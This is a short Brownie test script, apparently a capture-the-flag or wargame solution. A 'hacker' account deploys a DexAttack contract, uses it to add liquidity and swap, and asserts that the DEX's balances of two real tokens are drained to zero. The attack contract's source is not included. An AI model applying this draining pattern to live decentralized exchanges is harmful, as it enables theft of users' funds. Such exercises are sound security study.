from brownie import accounts, DexAttack, run

def test_attack():
    ctx = run('bootstrap')
    hacker = ctx['hacker']
    token1 = ctx['token1']
    token2 = ctx['token2']
    dex = ctx['dex']
    attack = DexAttack.deploy({'from': hacker})
    dex.add_liquidity(attack, 100, {'from': hacker})
    dex.swap(attack, token1, 100, {'from': hacker})
    assert token1.balanceOf(dex) == 0
    dex.add_liquidity(attack, 100, {'from': hacker})
    dex.swap(attack, token2, 100, {'from': hacker})
    assert token2.balanceOf(dex) == 0
